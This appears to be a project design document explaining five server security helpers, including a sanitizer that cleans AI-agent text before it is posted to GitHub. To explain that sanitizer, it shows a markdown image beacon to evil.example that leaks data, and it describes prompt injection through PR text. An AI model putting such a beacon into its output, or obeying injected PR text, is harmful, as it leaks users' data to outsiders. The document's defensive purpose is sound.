# Security primitives: small tools in `apps/server/src/lib/`

**In one sentence:** before the server handles sign-in, CLI tokens or webhooks, it needs four small, well-tested building blocks, and we port them from Odyhook instead of reinventing them. A fifth one, the output sanitizer, cleans what AI agents write before it reaches GitHub.

## Encryption at rest (`lib/crypto.ts`)

Some secrets have to be readable again later. Example: the GitHub access token we use to post comments as you. If the database leaked, those tokens should be useless, so we encrypt them with AES-256-GCM and the `ENCRYPTION_KEY` from the environment.

- **Encrypt, not hash,** because we need the original value back.
- **A fresh random IV (starting value) every time,** so encrypting the same token twice gives two different results, and nobody can spot that two rows hold the same secret.
- **GCM adds a tamper seal (the "auth tag").** If a single byte of the stored value changes, `decrypt` throws instead of returning garbage.

## Hashing tokens (`lib/tokens.ts`)

A CLI token (`nit_…`) only ever needs to be *checked*, never read back. So we store `sha256(token)`, like a password, and compare hashes when the CLI connects. If the database leaks, the attacker gets hashes, not working tokens. We also keep the first 8 characters (`nit_AbCd`) so a settings page can show which token is which.

The same file makes the `WDJB-MJHT` codes you compare between terminal and browser when logging in the CLI. They use consonants only, so they never spell words and have no 0/O or 1/I mix-ups.

## Webhook signatures (`lib/hmac.ts`)

GitHub signs every webhook body with a secret we share (an HMAC, a fingerprint only someone with the secret can make). We recompute it and compare. Two details matter:
- **Constant-time comparison** (`timingSafeEqual`): a normal `===` stops at the first wrong character, and an attacker can time that to guess the signature one character at a time.
- **Bad input is a "no", never a crash.** A header that is the wrong length or isn't hex returns `false` before it reaches `timingSafeEqual`, which would otherwise throw.

More on webhooks in `docs/why/webhooks.md`.

## Origin check (`lib/csrf.ts`)

Some routes use a cookie to know who you are, such as the "Approve this CLI" button. Browsers attach cookies automatically, so without a check, a page on `evil.example` could make *your* browser submit that form. CSRF (cross-site request forgery) is the name for this attack. Browsers tell us where a POST came from in the `Origin` header (or `Referer` as a fallback). `isAllowedOrigin` accepts only our own address, and says no when neither header is present.

## Cleaning what agents write (`lib/sanitize.ts`)

An AI agent reads the PR, and on a public repo anyone can put text in a PR, including text written to trick the agent ("prompt injection", explained in Plan 1b). So whatever an agent writes is treated as untrusted before Nitpilot posts it on GitHub (spec §14.6). `sanitizeForGithub`:

- **Redacts secrets** such as GitHub tokens (`ghp_…`), Anthropic keys (`sk-ant-…`), AWS key ids, our own `nit_` tokens and private keys, in case the agent copied one from the environment or the code.
- **Strips images and raw HTML.** An image is fetched when someone views the page, so `![x](https://evil.example/?data=…)` would send data to whoever owns that URL. Only the alt text is kept.
- **Removes HTML comments**, because our own hidden marker (`<!-- nitpilot:v1 … -->`, see [dispatcher.md](dispatcher.md)) is one. Agent text must never be able to fake it.
- **Defuses @mentions** of anyone outside the PR by wrapping them in backticks, so an agent can't ping strangers. Mentions inside code are left alone, since GitHub never pings from code.

The removals run **again and again until nothing changes**. One pass isn't enough: in `<<b>img src=…>`, removing the inner `<b>` leaves a brand-new `<img src=…>`.

## The React analogy

- Encryption at rest is like storing a value in `localStorage` only after encrypting it, so someone reading the disk can't use it.
- Hashing tokens is how you'd treat passwords: you never show them again, you only check them.
- The origin check is the server-side version of "only accept `postMessage` events whose `event.origin` is ours".
- The sanitizer is what you'd do before `dangerouslySetInnerHTML` with user content: never trust it, strip what can run or phone home.
